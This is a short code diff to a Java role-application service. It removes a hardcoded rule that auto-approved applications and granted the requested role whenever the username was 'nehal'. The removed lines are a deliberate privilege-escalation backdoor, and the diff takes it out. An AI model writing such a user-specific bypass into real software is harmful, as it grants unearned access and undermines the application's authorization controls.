@@ -33,13 +33,6 @@ public class RoleApplicationService {
                 .applicationDate(LocalDateTime.now())
                 .notes(notes)
                 .build();
-                
-        // Auto-approve if username is 'nehal'
-        if ("nehal".equalsIgnoreCase(username)) {
-            application.setStatus(ApplicationStatus.APPROVED);
-            user.getRoles().add(requestedRole);
-            userRepository.save(user);
-        }
 
         return applicationRepository.save(application);
     }
